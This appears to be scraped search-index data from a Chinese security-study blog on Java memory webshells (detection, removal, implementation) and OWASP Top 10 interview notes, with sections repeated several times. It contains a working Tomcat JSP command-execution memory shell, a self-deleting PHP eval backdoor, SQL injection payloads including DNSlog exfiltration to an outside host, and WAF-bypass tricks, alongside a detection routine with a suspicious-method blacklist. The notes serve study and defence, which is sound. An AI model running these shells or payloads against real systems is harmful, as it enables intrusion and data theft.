if(classLoader.getClass().getName().contains(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader\") || classLoader.getClass().getName().contains(\"com.sun.org.apache.bcel.internal.util.ClassLoader\")){ return true; } // 是否存在ClassLoader的文件目录下存在对应的class文件 if(classFileIsExists(targetClass)){ return true; } // filter是否包含恶意代码。 String[] blacklist = new String[]{\"getRuntime\",\"defineClass\",\"invoke\"}; String clsJavaCode = FernflowerUtils.decomper(targetClass,targetClassByte); for(String b:blacklist){ if(clsJavaCode.contains(b)){ return true; } } }else{ return false; } return false; } ","date":"2023-11-17","objectID":"/hvv_java/:0:12","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#filter优先级是第一位"},{"categories":["hvv"],"content":"\r内存马的识别\rfilter名字很特别内存马的filter名一般比较特别,有shell或者随机数等关键字.这个特征较弱,因为这取决于内存马的构造者的习惯,构造完全可以设置一个看起来很正常的名字 filter优先级是第一位为了确保内存马在各种环境下都可以访问,往往需要把filter匹配优先级调至最高,这在shiro反序列化中是刚需.但是在其他场景之下就非必须,之能作为一个可疑点 对比web.xml中没有filter配置由于内存马的filter是动态注册的,所以在web.xml中肯定没有配置,这个是个可以的特征.但servlet 3.0引入了@WebFiler标签方便开发这个动态注册filter.这种情况也存在没有在web.xml中显式声明,这个特征可以作为较强的特征. 特殊class loader加载我们都知道filter也是class,也是必须有特定的class loader加载.正常的filter都是由中间件的webappclassloader加载的.反序列化漏洞喜欢利用Templatesimpl和bcel执行任意代码.所以这些class往往就是下面这两个 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader com.sun.org.apache.bcel.internal.util.ClassLoader 这个特征是一个特别可疑的点.有的内存马还是比较狡猾的,他会注入class到当前线程中,然后实例化注入内存马.这个时候内存马就有可能不是上面的两个classloader 对应的classloader路径下面没有class文件所谓内存马就是代码驻留在内存中,本地无对应的class文件,所以我们只要检测filter对应的classloader目录下是否存在class文件 dilter的dofilter方法中有恶意代码我们可把内存中所有的filter的class dump出来,使用fernflower等反编译工具分析看看,是否存在恶意代码,，比如调用了如下可疑的方法： java.lang.Runtime.getRuntime defineClass invoke … 总的来讲这两类,也就是说filter型内存马首先是一个filter类,同时它在硬盘上没有对应的class文件。若dump出的class还有恶意代码，那是内存马无疑啦 检查思路抽象如下 private static boolean isMemshell(Class targetClass,byte[] targetClassByte){ ClassLoader classLoader = null; if(targetClass.getClassLoader() != null) { classLoader = targetClass.getClassLoader(); }else{ classLoader = Thread.currentThread().getContextClassLoader(); } Class clsFilter = null; try { clsFilter = classLoader.loadClass(\"javax.servlet.Filter\"); }catch (Exception e){ } // 是否是filter if(clsFilter != null \u0026\u0026 clsFilter.isAssignableFrom(targetClass)){ // class loader 是不是Templates或bcel if(classLoader.getClass().getName().contains(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader\") || classLoader.getClass().getName().contains(\"com.sun.org.apache.bcel.internal.util.ClassLoader\")){ return true; } // 是否存在ClassLoader的文件目录下存在对应的class文件 if(classFileIsExists(targetClass)){ return true; } // filter是否包含恶意代码。 String[] blacklist = new String[]{\"getRuntime\",\"defineClass\",\"invoke\"}; String clsJavaCode = FernflowerUtils.decomper(targetClass,targetClassByte); for(String b:blacklist){ if(clsJavaCode.contains(b)){ return true; } } }else{ return false; } return false; } ","date":"2023-11-17","objectID":"/hvv_java/:0:12","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#对比webxml中没有filter配置"},{"categories":["hvv"],"content":"\r内存马的识别\rfilter名字很特别内存马的filter名一般比较特别,有shell或者随机数等关键字.这个特征较弱,因为这取决于内存马的构造者的习惯,构造完全可以设置一个看起来很正常的名字 filter优先级是第一位为了确保内存马在各种环境下都可以访问,往往需要把filter匹配优先级调至最高,这在shiro反序列化中是刚需.但是在其他场景之下就非必须,之能作为一个可疑点 对比web.xml中没有filter配置由于内存马的filter是动态注册的,所以在web.xml中肯定没有配置,这个是个可以的特征.但servlet 3.0引入了@WebFiler标签方便开发这个动态注册filter.这种情况也存在没有在web.xml中显式声明,这个特征可以作为较强的特征. 特殊class loader加载我们都知道filter也是class,也是必须有特定的class loader加载.正常的filter都是由中间件的webappclassloader加载的.反序列化漏洞喜欢利用Templatesimpl和bcel执行任意代码.所以这些class往往就是下面这两个 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader com.sun.org.apache.bcel.internal.util.ClassLoader 这个特征是一个特别可疑的点.有的内存马还是比较狡猾的,他会注入class到当前线程中,然后实例化注入内存马.这个时候内存马就有可能不是上面的两个classloader 对应的classloader路径下面没有class文件所谓内存马就是代码驻留在内存中,本地无对应的class文件,所以我们只要检测filter对应的classloader目录下是否存在class文件 dilter的dofilter方法中有恶意代码我们可把内存中所有的filter的class dump出来,使用fernflower等反编译工具分析看看,是否存在恶意代码,，比如调用了如下可疑的方法： java.lang.Runtime.getRuntime defineClass invoke … 总的来讲这两类,也就是说filter型内存马首先是一个filter类,同时它在硬盘上没有对应的class文件。若dump出的class还有恶意代码，那是内存马无疑啦 检查思路抽象如下 private static boolean isMemshell(Class targetClass,byte[] targetClassByte){ ClassLoader classLoader = null; if(targetClass.getClassLoader() != null) { classLoader = targetClass.getClassLoader(); }else{ classLoader = Thread.currentThread().getContextClassLoader(); } Class clsFilter = null; try { clsFilter = classLoader.loadClass(\"javax.servlet.Filter\"); }catch (Exception e){ } // 是否是filter if(clsFilter != null \u0026\u0026 clsFilter.isAssignableFrom(targetClass)){ // class loader 是不是Templates或bcel if(classLoader.getClass().getName().contains(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader\") || classLoader.getClass().getName().contains(\"com.sun.org.apache.bcel.internal.util.ClassLoader\")){ return true; } // 是否存在ClassLoader的文件目录下存在对应的class文件 if(classFileIsExists(targetClass)){ return true; } // filter是否包含恶意代码。 String[] blacklist = new String[]{\"getRuntime\",\"defineClass\",\"invoke\"}; String clsJavaCode = FernflowerUtils.decomper(targetClass,targetClassByte); for(String b:blacklist){ if(clsJavaCode.contains(b)){ return true; } } }else{ return false; } return false; } ","date":"2023-11-17","objectID":"/hvv_java/:0:12","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#特殊class-loader加载"},{"categories":["hvv"],"content":"\r内存马的识别\rfilter名字很特别内存马的filter名一般比较特别,有shell或者随机数等关键字.这个特征较弱,因为这取决于内存马的构造者的习惯,构造完全可以设置一个看起来很正常的名字 filter优先级是第一位为了确保内存马在各种环境下都可以访问,往往需要把filter匹配优先级调至最高,这在shiro反序列化中是刚需.但是在其他场景之下就非必须,之能作为一个可疑点 对比web.xml中没有filter配置由于内存马的filter是动态注册的,所以在web.xml中肯定没有配置,这个是个可以的特征.但servlet 3.0引入了@WebFiler标签方便开发这个动态注册filter.这种情况也存在没有在web.xml中显式声明,这个特征可以作为较强的特征. 特殊class loader加载我们都知道filter也是class,也是必须有特定的class loader加载.正常的filter都是由中间件的webappclassloader加载的.反序列化漏洞喜欢利用Templatesimpl和bcel执行任意代码.所以这些class往往就是下面这两个 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader com.sun.org.apache.bcel.internal.util.ClassLoader 这个特征是一个特别可疑的点.有的内存马还是比较狡猾的,他会注入class到当前线程中,然后实例化注入内存马.这个时候内存马就有可能不是上面的两个classloader 对应的classloader路径下面没有class文件所谓内存马就是代码驻留在内存中,本地无对应的class文件,所以我们只要检测filter对应的classloader目录下是否存在class文件 dilter的dofilter方法中有恶意代码我们可把内存中所有的filter的class dump出来,使用fernflower等反编译工具分析看看,是否存在恶意代码,，比如调用了如下可疑的方法： java.lang.Runtime.getRuntime defineClass invoke … 总的来讲这两类,也就是说filter型内存马首先是一个filter类,同时它在硬盘上没有对应的class文件。若dump出的class还有恶意代码，那是内存马无疑啦 检查思路抽象如下 private static boolean isMemshell(Class targetClass,byte[] targetClassByte){ ClassLoader classLoader = null; if(targetClass.getClassLoader() != null) { classLoader = targetClass.getClassLoader(); }else{ classLoader = Thread.currentThread().getContextClassLoader(); } Class clsFilter = null; try { clsFilter = classLoader.loadClass(\"javax.servlet.Filter\"); }catch (Exception e){ } // 是否是filter if(clsFilter != null \u0026\u0026 clsFilter.isAssignableFrom(targetClass)){ // class loader 是不是Templates或bcel if(classLoader.getClass().getName().contains(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader\") || classLoader.getClass().getName().contains(\"com.sun.org.apache.bcel.internal.util.ClassLoader\")){ return true; } // 是否存在ClassLoader的文件目录下存在对应的class文件 if(classFileIsExists(targetClass)){ return true; } // filter是否包含恶意代码。 String[] blacklist = new String[]{\"getRuntime\",\"defineClass\",\"invoke\"}; String clsJavaCode = FernflowerUtils.decomper(targetClass,targetClassByte); for(String b:blacklist){ if(clsJavaCode.contains(b)){ return true; } } }else{ return false; } return false; } ","date":"2023-11-17","objectID":"/hvv_java/:0:12","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#对应的classloader路径下面没有class文件"},{"categories":["hvv"],"content":"\r内存马的识别\rfilter名字很特别内存马的filter名一般比较特别,有shell或者随机数等关键字.这个特征较弱,因为这取决于内存马的构造者的习惯,构造完全可以设置一个看起来很正常的名字 filter优先级是第一位为了确保内存马在各种环境下都可以访问,往往需要把filter匹配优先级调至最高,这在shiro反序列化中是刚需.但是在其他场景之下就非必须,之能作为一个可疑点 对比web.xml中没有filter配置由于内存马的filter是动态注册的,所以在web.xml中肯定没有配置,这个是个可以的特征.但servlet 3.0引入了@WebFiler标签方便开发这个动态注册filter.这种情况也存在没有在web.xml中显式声明,这个特征可以作为较强的特征. 特殊class loader加载我们都知道filter也是class,也是必须有特定的class loader加载.正常的filter都是由中间件的webappclassloader加载的.反序列化漏洞喜欢利用Templatesimpl和bcel执行任意代码.所以这些class往往就是下面这两个 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader com.sun.org.apache.bcel.internal.util.ClassLoader 这个特征是一个特别可疑的点.有的内存马还是比较狡猾的,他会注入class到当前线程中,然后实例化注入内存马.这个时候内存马就有可能不是上面的两个classloader 对应的classloader路径下面没有class文件所谓内存马就是代码驻留在内存中,本地无对应的class文件,所以我们只要检测filter对应的classloader目录下是否存在class文件 dilter的dofilter方法中有恶意代码我们可把内存中所有的filter的class dump出来,使用fernflower等反编译工具分析看看,是否存在恶意代码,，比如调用了如下可疑的方法： java.lang.Runtime.getRuntime defineClass invoke … 总的来讲这两类,也就是说filter型内存马首先是一个filter类,同时它在硬盘上没有对应的class文件。若dump出的class还有恶意代码，那是内存马无疑啦 检查思路抽象如下 private static boolean isMemshell(Class targetClass,byte[] targetClassByte){ ClassLoader classLoader = null; if(targetClass.getClassLoader() != null) { classLoader = targetClass.getClassLoader(); }else{ classLoader = Thread.currentThread().getContextClassLoader(); } Class clsFilter = null; try { clsFilter = classLoader.loadClass(\"javax.servlet.Filter\"); }catch (Exception e){ } // 是否是filter if(clsFilter != null \u0026\u0026 clsFilter.isAssignableFrom(targetClass)){ // class loader 是不是Templates或bcel if(classLoader.getClass().getName().contains(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader\") || classLoader.getClass().getName().contains(\"com.sun.org.apache.bcel.internal.util.ClassLoader\")){ return true; } // 是否存在ClassLoader的文件目录下存在对应的class文件 if(classFileIsExists(targetClass)){ return true; } // filter是否包含恶意代码。 String[] blacklist = new String[]{\"getRuntime\",\"defineClass\",\"invoke\"}; String clsJavaCode = FernflowerUtils.decomper(targetClass,targetClassByte); for(String b:blacklist){ if(clsJavaCode.contains(b)){ return true; } } }else{ return false; } return false; } ","date":"2023-11-17","objectID":"/hvv_java/:0:12","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#dilter的dofilter方法中有恶意代码"},{"categories":["hvv"],"content":"\r内存马的查杀\r清除内存马中的filter的恶意代码\r模拟中间件注销filter两种方法各有优劣，第一种方法比较通用，直接适配所有中间件。但恶意Filter依然在，只是恶意代码被清除了。第二种方法比较优雅，恶意Filter会被清除掉。但每种中间件注销Filter的逻辑不尽相同，需要一一适配 https://gv7.me/articles/2020/kill-java-web-filter-memshell/ [Tomcat 内存马学习(一)：Filter型 (qq.com)](内存马，也称无文件马，是无文件攻击的一种常用手段。 ","date":"2023-11-17","objectID":"/hvv_java/:0:13","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#内存马的查杀"},{"categories":["hvv"],"content":"\r内存马的查杀\r清除内存马中的filter的恶意代码\r模拟中间件注销filter两种方法各有优劣，第一种方法比较通用，直接适配所有中间件。但恶意Filter依然在，只是恶意代码被清除了。第二种方法比较优雅，恶意Filter会被清除掉。但每种中间件注销Filter的逻辑不尽相同，需要一一适配 https://gv7.me/articles/2020/kill-java-web-filter-memshell/ [Tomcat 内存马学习(一)：Filter型 (qq.com)](内存马，也称无文件马，是无文件攻击的一种常用手段。 ","date":"2023-11-17","objectID":"/hvv_java/:0:13","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#清除内存马中的filter的恶意代码"},{"categories":["hvv"],"content":"\r内存马的查杀\r清除内存马中的filter的恶意代码\r模拟中间件注销filter两种方法各有优劣，第一种方法比较通用，直接适配所有中间件。但恶意Filter依然在，只是恶意代码被清除了。第二种方法比较优雅，恶意Filter会被清除掉。但每种中间件注销Filter的逻辑不尽相同，需要一一适配 https://gv7.me/articles/2020/kill-java-web-filter-memshell/ [Tomcat 内存马学习(一)：Filter型 (qq.com)](内存马，也称无文件马，是无文件攻击的一种常用手段。 ","date":"2023-11-17","objectID":"/hvv_java/:0:13","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#模拟中间件注销filter"},{"categories":["hvv"],"content":"\r0x0 基础知识","date":"2023-11-17","objectID":"/hvv_java/:1:0","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#0x0-基础知识"},{"categories":["hvv"],"content":"\rServletServlet是运行在web服务器或应用服务器上的程序，它是作为来自HTTP客户端的请求和HTTP服务器上的数据库或应用程序之间的中间层。它负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。 1.请求的处理过程 客户端发起一个http请求，比如get类型。 Servlet容器接收到请求，根据请求信息，封装成HttpServletRequest和HttpServletResponse对象。 Servlet容器调用HttpServlet的init()方法，init方法只在第一次请求的时候被调用。 Servlet容器调用service()方法。 service()方法根据请求类型，这里是get类型，分别调用doGet或者doPost方法，这里调用doGet方法。 doXXX方法中是我们自己写的业务逻辑。 业务逻辑处理完成之后，返回给Servlet容器，然后容器将结果返回给客户端。 容器关闭时候，会调用destory方法。 2.servlet生命周期 1）服务器启动时(web.xml中配置load-on-startup=1，默认为0)或者第一次请求该servlet时，就会初始化一个Servlet对象，也就是会执行初始化方法init(SerlvetConfig conf)。 2）servlet对象去处理所有客户端请求，在service(ServletRequest req，ServletResponse res)方法中执行 3）服务器关闭时，销毁这个servlet对象，执行destroy()方法。 4）由JVM进行垃圾回收。 ","date":"2023-11-17","objectID":"/hvv_java/:1:1","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#servlet"},{"categories":["hvv"],"content":"\rFilterfilter也称之为过滤器，是对Servlet技术的一个强补充，其主要功能是在HttpServletRequest到达 Servlet 之前，拦截客户的HttpServletRequest ，根据需要检查HttpServletRequest，也可以修改HttpServletRequest 头和数据；在HttpServletResponse到达客户端之前，拦截HttpServletResponse ，根据需要检查HttpServletResponse，也可以修改HttpServletResponse头和数据。 ","date":"2023-11-17","objectID":"/hvv_java/:1:2","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#filter"},{"categories":["hvv"],"content":"\rListenerJavaWeb开发中的监听器(Listener)就是Application、Session和Request三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行的功能组件。 **ServletContextListener：**对Servlet上下文的创建和销毁进行监听； **ServletContextAttributeListener：**监听Servlet上下文属性的添加、删除和替换； **HttpSessionListener：**对Session的创建和销毁进行监听。Session的销毁有两种情况，一个中Session超时，还有一种是通过调用Session对象的invalidate()方法使session失效。 **HttpSessionAttributeListener：**对Session对象中属性的添加、删除和替换进行监听； **ServletRequestListener：**对请求对象的初始化和销毁进行监听； **ServletRequestAttributeListener：**对请求对象属性的添加、删除和替换进行监听。 用途 可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。 ","date":"2023-11-17","objectID":"/hvv_java/:1:3","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#listener"},{"categories":["hvv"],"content":"\rTomcat简单理解，tomcat是http服务器+servlet容器。 Tomcat作为Servlet容器，将http请求文本接收并解析，然后封装成HttpServletRequest类型的request对象，传递给servlet；同时会将相应的信息封装为HttpServletRequesponse类型的response对象，然后将response交给tomcat，tomcat就会将其变成响应文本的格式发送给浏览器。 ","date":"2023-11-17","objectID":"/hvv_java/:1:4","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#tomcat"},{"categories":["hvv"],"content":"\r0x1 webshell变迁web服务端管理页面→大马→小马拉大马→一句话木马→加密一句话木马→加密内存马 ","date":"2023-11-17","objectID":"/hvv_java/:2:0","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#0x1-webshell变迁"},{"categories":["hvv"],"content":"\r0x2 如何实现webshell内存马**目标：**访问任意url或者url，带上命令执行参数，即可让服务器返回命令执行结果。 **实现：**以java为例，客户端发起的web请求会依次经过Listener、Filter、Servlet三个组件，我们只要在这个请求的过程中做手脚，在内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode，就可以达到我们的目的。 ","date":"2023-11-17","objectID":"/hvv_java/:3:0","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#0x2-如何实现webshell内存马"},{"categories":["hvv"],"content":"\r0x3 内存马攻击原理通过动态注册一个新的Filter或者向Filter中注入恶意的shellcode，让Filter允许攻击者访问到web服务器内存中的数据。主要拥有了可用的Filter，攻击者就能进行远程攻击，而不管是shellcode的注入过程还是对web服务器数据进行访问的过程都会在内存中出现异常行为。另外，由于web服务器在网络中与数据库和权限系统连接，攻击者在入侵后，可以更轻易地进行横向的渗透，拿到多个主机的权限。 ","date":"2023-11-17","objectID":"/hvv_java/:4:0","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#0x3-内存马攻击原理"},{"categories":["hvv"],"content":"\r0x4 内存马实现这里是以tomcat的servletAPI型内存马为例讲一下内存马的实现。 下面代码先是创建了一个恶意的servlet，然后获取当前的StandardContext，然后将恶意servlet封装成wrapper添加到Standard Context当中，最后添加ServletMapping将访问的URL和wrapper进行绑定。 \u003c%@ page import=\"java.ip.IOException\" %\u003e \u003c%@ page import=\"java.io.InputStream\" %\u003e \u003c%@ page import=\"java.util.Scanner\" %\u003e \u003c%@ page import=\"org.apache.catalina.core.StandardContext\" %\u003e \u003c%@ page import=\"java.io.printWriter\" %\u003e \u003c% // 创建恶意Servlet Servlet servlet = new Servlet() { @Override public void init(ServletConfig servletConfig) throws ServletException { } @Override public ServletConfig getServletConfig() { return null; } @Override public void service(ServletRequest servletRequest,ServletResponse servletResponse) throws ServletException,IOException{ String cmd = servletRequest.getParameter(\"cmd\"); boolean is Linux = true; String osTyp = System.getProperty(\"os.name\"); if (osTyp != null \u0026\u0026 osTyp.toLowerCase().contains(\"win\")) { isLinux = false; } String[] cmds = isLinux ? new String[]{\"sh\",\"-c\",cmd} : new String[]{\"cmd.exe\",\"/c\",cmd}; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = new Scanner(in).useDelimiter(\"\\\\a\"); String output = s.hasNext() ? s.next() : \"\"; PrintWriter out = servletResponse.getWriter(); out.println(output); out.flush(); out.close(); } @Override public String getServletInfo() { return null; } @Override public void destroy() { } }; %\u003e \u003c% // 获取StandardContext org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase)Thread.currentThread().getContextClassLoader(); StandardContext standardCtx = (StandardContext)webappClassLoaderBase.getResources().getContext(); // 用Wrapper对其进行封装 org.apache.catalina.Wrapper newWrapper = standardCtx.createWrapper(); newWrapper.setName(\"jweny\"); newWrapper.setLoadOnStartup(1); newWrapper.setServlet(servlet); newWrapper.setServletClass(servlet.getClass().getName()); // 添加封装后的恶意Wrapper到StandardContext的children当中 standardCtx.addChild(newWrapper); // 添加ServletMapping将访问的URL和Servlet进行绑定 standardCtx.addServletMapping(\"/shell\",\"jweny\"); %\u003e 执行上述代码后，访问当前应用的/shell路径，加上cmd参数就可以命令执行了。使用新增servlet的方式就需要绑定指定的URL。如果我们想要更加隐蔽，做到内存马与URL无关，无论这个url是原生servlet还是某个struts action，甚至无论这个url是否真的存在，只要我们的请求传递给tomcat，tomcat就能相应我们的指令，那就得通过注入新的或修改已有的filter或者listener的方式来实现了。 ","date":"2023-11-17","objectID":"/hvv_java/:5:0","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#0x4-内存马实现"},{"categories":["hvv"],"content":"\r0x5 内存马查杀**方法一：**清除内存马中的Filter的恶意代码。这种方式相对通用简单一些，直接适配所有中间件。 **方法二：**模拟中间件注销Filter。这种方式相对要复杂一些，因为每种中间件注销Filter的逻辑不尽相同，需要一一适配。 ","date":"2023-11-17","objectID":"/hvv_java/:6:0","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#0x5-内存马查杀"},{"categories":["hvv"],"content":"\r0x6 内存马实例 \u003c?php set_time_limit(0); //set_time_limit()函数：设置允许脚本运行的时间，单位为秒。如果设置为0，没有时间方面的限制。 ignore_user_abort(1); //ignore_user_abort()函数：函数设置与客户机断开是否会终止脚本的执行，如果设置为true，则忽略与用户的断开。 unlink(__FILE__); //unlink(__FILE__)函数：删除文件。 while(1){ $content = '\u003c?php @eval($_POST[\"geek\"])?\u003e'; file_put_contents(\"22.php\",$content); //file_put_contents函数：将一个字符串写入文件。 usleep(10000); //usleep函数：延迟执行当前脚本若干微妙 } ?\u003e 将php不死马放到web目录下， 访问代码执行成功生成后门 对于不死马，直接删除脚本是没有用的，因为php执行的时候已经把脚本读进去解释成opcode运行了。使用条件竞争写入同名文件进行克制不死马。 将usleep改为小于php不死马的参数，查看22.php已修改成叹号。 参考资料： 黑客攻击之道—内存马 ","date":"2023-11-17","objectID":"/hvv_java/:7:0","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#0x6-内存马实例"},{"categories":["hvv"],"content":"HVV专题–OWASP TOP10漏洞 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#"},{"categories":["hvv"],"content":"\rTOP10漏洞 1、SQL注入 2、失效的身份认证和会话管理 3、跨站脚本攻击XSS 4、直接引用不安全的对象 5、安全配置错误 6、敏感信息泄露 7、缺少功能级的访问控制 8、跨站请求伪造CSRF 9、使用含有已知漏洞的组件 10、未验证的重定向和转发 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#top10漏洞"},{"categories":["hvv"],"content":"\r常见web漏洞","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#常见web漏洞"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 